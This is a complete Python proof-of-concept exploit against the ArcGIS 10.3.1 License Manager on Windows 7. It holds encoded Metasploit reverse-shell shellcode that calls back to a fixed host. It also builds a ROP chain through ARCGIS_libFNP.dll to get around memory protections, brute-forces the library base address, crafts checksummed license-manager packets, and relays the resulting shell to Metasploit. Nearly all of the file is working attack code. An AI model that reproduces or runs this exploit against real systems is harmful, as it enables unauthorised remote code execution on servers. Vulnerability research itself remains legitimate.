###########################################################
# Title:        POC Exploit ArcGIS 10.3.1 License Manager
# Description:  Given the memory protections employed by the application, 
#               and the fact that we did not have a memory leak at the time,
#               we decided to attempt to brute force the correct base address
#               for our ROP chain. This POC takes between 5-30 mins to land.
#
# Target:       Windows 7, x86
#

from pwn import *
import struct
import binascii
import random
import time
from threading import Thread
from timeit import default_timer as timer

# windows/shell/reverse_tcp - 308 bytes (stage 1)
# http://www.metasploit.com
# Encoder: x86/shikata_ga_nai
# VERBOSE=false, LHOST=192.168.229.133, LPORT=4444, 
# ReverseConnectRetries=5, ReverseListenerBindPort=0, 
# ReverseAllowProxy=false, ReverseListenerThreaded=false, 
# PayloadUUIDTracking=false, EnableStageEncoding=false, 
# StageEncoderSaveRegisters=, StageEncodingFallback=true, 
# PrependMigrate=false, EXITFUNC=process, 
# InitialAutoRunScript=, AutoRunScript=
buf =  ""
buf += "\xba\x6e\x94\xc5\x2e\xd9\xea\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x47\x31\x50\x13\x83\xe8\xfc\x03\x50\x61\x76"
buf += "\x30\xd2\x95\xf4\xbb\x2b\x65\x99\x32\xce\x54\x99\x21"
buf += "\x9a\xc6\x29\x21\xce\xea\xc2\x67\xfb\x79\xa6\xaf\x0c"
buf += "\xca\x0d\x96\x23\xcb\x3e\xea\x22\x4f\x3d\x3f\x85\x6e"
buf += "\x8e\x32\xc4\xb7\xf3\xbf\x94\x60\x7f\x6d\x09\x05\x35"
buf += "\xae\xa2\x55\xdb\xb6\x57\x2d\xda\x97\xc9\x26\x85\x37"
buf += "\xeb\xeb\xbd\x71\xf3\xe8\xf8\xc8\x88\xda\x77\xcb\x58"
buf += "\x13\x77\x60\xa5\x9c\x8a\x78\xe1\x1a\x75\x0f\x1b\x59"
buf += "\x08\x08\xd8\x20\xd6\x9d\xfb\x82\x9d\x06\x20\x33\x71"
buf += "\xd0\xa3\x3f\x3e\x96\xec\x23\xc1\x7b\x87\x5f\x4a\x7a"
buf += "\x48\xd6\x08\x59\x4c\xb3\xcb\xc0\xd5\x19\xbd\xfd\x06"
buf += "\xc2\x62\x58\x4c\xee\x77\xd1\x0f\x66\xbb\xd8\xaf\x76"
buf += "\xd3\x6b\xc3\x44\x7c\xc0\x4b\xe4\xf5\xce\x8c\x0b\x2c"
buf += "\xb6\x03\xf2\xcf\xc7\x0a\x30\x9b\x97\x24\x91\xa4\x73"
buf += "\xb5\x1e\x71\xd3\xe5\xb0\x2a\x94\x55\x70\x9b\x7c\xbc"
buf += "\x7f\xc4\x9d\xbf\xaa\x6d\x37\x45\x3c\x52\x60\xa0\x39"
buf += "\x3a\x73\x2b\x50\xe7\xfa\xcd\x38\x07\xab\x46\xd4\xbe"
buf += "\xf6\x1d\x45\x3e\x2d\x58\x45\xb4\xc2\x9c\x0b\x3d\xae"
buf += "\x8e\xfb\xcd\xe5\xed\xad\xd2\xd3\x98\x51\x47\xd8\x0a"
buf += "\x06\xff\xe2\x6b\x60\xa0\x1d\x5e\xfb\x69\x88\x21\x93"
buf += "\x95\x5c\xa2\x63\xc0\x36\xa2\x0b\xb4\x62\xf1\x2e\xbb"
buf += "\xbe\x65\xe3\x2e\x41\xdc\x50\xf8\x29\xe2\x8f\xce\xf5"
buf += "\x1d\xfa\xce\xca\xcb\xc2\xa4\x22\xc8"

#host ='54.165.166.161'
port = 27000

if len (sys.argv) == 2:
    (progname, host) = sys.argv
else:
    print len (sys.argv)
    print 'Usage: {0} host '.format (sys.argv[0])
    exit (1)
    
   
def create_rop_chain( base_addr ):

    # rop chain generated with mona.py - www.corelan.be
    #rop_gadgets = [
    #  0x69ed1d0e,  # POP ECX # RETN [ARCGIS_libFNP.dll] 
    #  0x69f25174,  # ptr to &VirtualAlloc() [IAT ARCGIS_libFNP.dll]
    #  0x69c6d2bb,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [ARCGIS_libFNP.dll] 
    #  #####0x69ec46f2,  # LEA ESI,EAX # RETN [ARCGIS_libFNP.dll] 
    #  0x69dddf16 (RVA : 0x001bdf16) : # XCHG EAX,ESI # RETN    ** [ARCGIS_libFNP.dll] **   |   {PAGE_EXECUTE_READ}
    #  0x69e46270,  # POP EBP # RETN [ARCGIS_libFNP.dll] 
    #  0x69ed1737,  # & call esp [ARCGIS_libFNP.dll]
    
    #  0x69e20931,  # XOR EAX,EAX # RETN    ** [ARCGIS_libFNP.dll] **   |   {PAGE_EXECUTE_READ}
    #  0x69e4d25e (RVA : 0x0022d25e) : # XCHG EAX,EBX # RETN   
    #  0x69c6d29c,  # ADD EBX,EAX # XOR EAX,EAX # RETN    ** [ARCGIS_libFNP.dll] **   |   {PAGE_EXECUTE_READ}
    #  0x69e2092f,  # INC EBX # XOR EAX,EAX # RETN    0x00000001-> ebx
   
    #  0x69dbdf68,  # POP EAX # RETN [ARCGIS_libFNP.dll] 
    #  0xcc2659f1, 
    #  0x69dee48b,  # ADD EAX,33D9B60F # RETN  
    #  0x69d596ca,  # XCHG EAX,EDX # RETN    0x00001000-> edx
 
    #  0x69dbdf68,  # POP EAX # RETN [ARCGIS_libFNP.dll] 
    #  0xcc264a31, 
    #  0x69dee48b,  # ADD EAX,33D9B60F # RETN  
    #  0x69c32fbb,  # XCHG EAX,ECX # RETN    0x00000040-> ecx

    #  0x69d1de59,  # POP EDI # RETN [ARCGIS_libFNP.dll] 
    #  0x69dd55ba,  # RETN (ROP NOP) [ARCGIS_libFNP.dll]
    #  0x69dbdf68,  # POP EAX # RETN [ARCGIS_libFNP.dll] 
    #  0x90909090,  # nop
    #  0x69d2ce9c,  # PUSHAD # RETN [ARCGIS_libFNP.dll] 
    #]
    
    rel_rop_gadgets = [
      base_addr + 0x1b55ba,  # RETN (ROP NOP) [ARCGIS_libFNP.dll]
      0x90909090,  # nop
      0x90909090,  # nop
      base_addr + 0x2b1d0e,  # POP ECX # RETN [ARCGIS_libFNP.dll] 
      base_addr + 0x305174,  # ptr to &VirtualAlloc() [IAT ARCGIS_libFNP.dll]
      base_addr + 0x4d2bb,  # MOV EsockAX,DWORD PTR DS:[ECX] # RETN [ARCGIS_libFNP.dll] 
      base_addr + 0x1bdf16,  #  XCHG EAX,ESI # RETN 
      base_addr + 0x226270,  # POP EBP # RETN [ARCGIS_libFNP.dll] 
      base_addr + 0x2b1737,  # & call esp [ARCGIS_libFNP.dll]
    
      base_addr + 0x200931,  # XOR EAX,EAX # RETN    ** [ARCGIS_libFNP.dll] **   |   {PAGE_EXECUTE_READ}
      base_addr + 0x22d25e,  # XCHG EAX,EBX # RETN   
      base_addr + 0x20092f,  # INC EBX # XOR EAX,EAX # RETN    0x00000001-> ebx
   
      base_addr + 0x19df68,  # POP EAX # RETN [ARCGIS_libFNP.dll] 
      0xcc2659f1, 
      base_addr + 0x1ce48b,  # ADD EAX,33D9B60F # RETN  
      base_addr + 0x1396ca,  # XCHG EAX,EDX # RETN    0x00001000-> edx
 
      base_addr + 0x19df68,  # POP EAX # RETN [ARCGIS_libFNP.dll] 
      0xcc264a31, 
      base_addr + 0x1ce48b,  # ADD EAX,33D9B60F # RETN  
      base_addr + 0x12fbb,  # XCHG EAX,ECX # RETN    0x00000040-> ecx

      base_addr + 0xfde59,  # POP EDI # RETN [ARCGIS_libFNP.dll] 
      base_addr + 0x1b55ba,  # RETN (ROP NOP) [ARCGIS_libFNP.dll]
      base_addr + 0x19df68,  # POP EAX # RETN [ARCGIS_libFNP.dll] 
      0x90909090,  # nop
      base_addr + 0x10ce9c,  # PUSHAD # RETN [ARCGIS_libFNP.dll] 
    ]
    
    return ''.join(struct.pack('<I', _) for _ in rel_rop_gadgets)


def header_checksum(packet,header_len = 20):
  packet_bytes = packet
  checksum = ord(packet_bytes[0])
  i = 2
  while i < header_len:
    checksum = checksum + ord(packet_bytes[i])
    i = i + 1
    
  return (checksum & 0x0FF)
  

def data_checksum(packet_data):
  word_table = []
  i = 0
  while i < 256:
    v4 = 0
    v3 = i
    j = 8

    while j > 0:
      if ((v4 ^ v3) & 1) == 1:
	v4 = ((v4 >> 1) ^ 0x3A5D) & 0x0FFFF
      else:
	v4 = (v4 >> 1) & 0x0FFFF
        
      v3 >>= 1
      j = j - 1
      

    word_table.append( v4 & 0x0FFFF )
    i = i + 1
    
  k = 0
  checksum = 0
  data_bytes = packet_data
  while k < len(packet_data):
    position = ord(data_bytes[k]) ^ (checksum & 0x0FF)
    this_word = word_table[position] & 0x0FFFF
    checksum = (this_word ^ (checksum >> 8)) & 0x0FFFF
    k = k + 1
    
  return checksum
  

def get_LM_port(host,port):
  conn3 = remote(host,port)

  username = "USERNAME"
  computername = "COMPUTERNAME" 
  pkt = "\x68"
  pkt += "\x00" # header checksum
  pkt += "\x31\x33" # pkt length
  pkt += username + "\x00"*(20 - len(username) + 1 )
  pkt += computername + "\x00"*(32 - len(computername) + 1 )
  pkt += "ARCGIS" + "\x00"*5
  pkt += computername + "\x00"*(32 - len(computername) + 1 )
  pkt += "\x54"
  pkt += "\x00"*12
  pkt += "\x32\x34\x34\x80" + "\x00"*7
  pkt += "i86_n3" + "\x00"*7
  pkt += "\x0b\x0c\x37\x38\x00\x31\x34\x00"

  hdr_sum = header_checksum(pkt,len(pkt))
  pkt = pkt[:1] + chr(hdr_sum) + pkt[2:]
  
  #print binascii.hexlify(pkt)
  
  conn3.send(pkt)
  resp = conn3.recv()

  conn3.close()
  if resp == None:
    return None
  
  #print binascii.hexlify(resp)
  str_port = resp[-9:-7]
  lmport = struct.unpack('>H', str_port)[0] #nasty code to get the integer of the port
  return lmport

def create_packet(seq_num, cmd, data ):
  pkt = "\x2f"  #possible command, might try to fuzz this
  pkt += "\x00" # header checksum
  pkt += "\x00\x00" # data checksum
  pkt += "\x00\x00" # pkt length

  pkt += struct.pack( ">H", cmd )
    
  pkt += struct.pack( "I", seq_num)
  pkt += "\x00\x00\x00\x00\x00\x00\x00\x00" # Padding to finish the header
  pkt += data
  pkt += "\x00" #add null terminator

  pkt_len = struct.pack( ">H", len(pkt))
  pkt = pkt[:4] + pkt_len + pkt[6:]
 
  data_sum = data_checksum(pkt[4:])
  data_sum_str = struct.pack( ">H", data_sum)
  pkt = pkt[:2] + data_sum_str + pkt[4:]

  hdr_sum = header_checksum(pkt[:20])
  pkt = pkt[:1] + chr(hdr_sum) + pkt[2:]
  return pkt


#######################################################################
#  
#   This function sends a message to lmgrd to restart the crashed
#   ARGCIS service
#
def restart_svc(host,port):
  
  cmd = 0x107  

  data  = "A"*0x400
  data += "\x00" 

  #Custom shellcode
  data += "127.0.0.1"
  data += "\x00"

  data += "ARCGIS"
  data += "\x00"
  data += "D"*4 
  data += "D"*4 
  data += "\x00"
  data += "E"*40

  seq_num = random.randrange(16843009,4294967295) #get random number in range from \x01010101 to \xFFFFFFFF. Could try fuzzing this possibly in the future
  pkt = create_packet(seq_num, cmd, data)
  #print binascii.hexlify(pkt)

  conn3 = remote(host,port)
  conn3.send(pkt)  
        
  try:
    response = conn3.recv(timeout=1)
  except EOFError as e:
    print e

  conn3.close()


#######################################################################
#  
#   This function listens for the incoming stage and acts like a proxy
#   to metasploit. The reason for this is so we can check when the exploit
#   landed and stop brute forcing
#
def recv_conn():
  global sock
  global sock2
  
  proxy_port = 4444
  msf_port = 4445
  local_host = "127.0.0.1"

  #Listening for incoming connection on port 4444
  sock = listen( proxy_port )
  sock.wait_for_connection()

  #Connet to msf
  sock2 = remote(local_host,msf_port)

  #Connect the pipes
  if sock:
    sock.connect_output(sock2)
  
  if sock2:
    sock2.connect_output(sock)

#Set globals
sock = None
sock2 = None
  
recv_thread = Thread(target=recv_conn)
recv_thread.start()

start = timer()

while True:
  
  #Generate the base address 0x6100 - 0x6fff0000
  base = 0x60000000
  rand = random.randrange(0x100,0xf00) << 16
  base = base + rand

  print "[+] Trying Base Address: " + hex(base)
  rop_chain = create_rop_chain( base )
  #print "[+] ROP length: " + str(len(rop_chain))

  #Make sure the service is started
  restart_svc(host,port)
  time.sleep(1)
  
  cmd = 0x107
  lmport= get_LM_port(host,port)
  if lmport == 0:
    time.sleep(1)
    continue
  
  print "[+] ARCGIS Daemon is running on " + str(lmport)

  #Initial pivot with VirtualAlloc shellcode
  data  = "A"*0x154
  data += rop_chain                     #pivot to here
  data += "\x90" * (0x3fe - len(data))  #nops
  data += "\xeb\x02"                    #short jump to bigger buffer below
  data += "\x00" 

  #Custom shellcode
  data += "\x90"*8                      #few nops
  data += buf                           #shellcode
  data += "\xcc"* (0x400 - (len(buf) + 8)) 
  data += "\x00"

  data += "C"*0xa
  data += "\x00"
  data += "D"*4 
  data += "E"*40

  #EIP
  data += struct.pack( "I", base + 0x23f78e)   #{pivot 4240 / 0x1090} :  # ADD ESP,1090 # RETN 0x08 
  data += "\x00"
  data += "F"*100

  seq_num = random.randrange(16843009,4294967295) #get random number in range from \x01010101 to \xFFFFFFFF. Could try fuzzing this possibly in the future
  pkt = create_packet(seq_num, cmd, data)
  #print binascii.hexlify(pkt)

  conn2 = remote(host,lmport)
  conn2.send(pkt)
        
  try:
    response = conn2.recv(timeout=0.5)
  except EOFError as e:
    print e

  #Check if exploit worked
  if sock2:
    end = timer()
    print "[+] Found Base Address: " + hex( base )
    print "[+] Time to exploit: " + str(end-start) + "s"
    while True:
      time.sleep(0.1)
      
  #Close and start over    
  conn2.close()


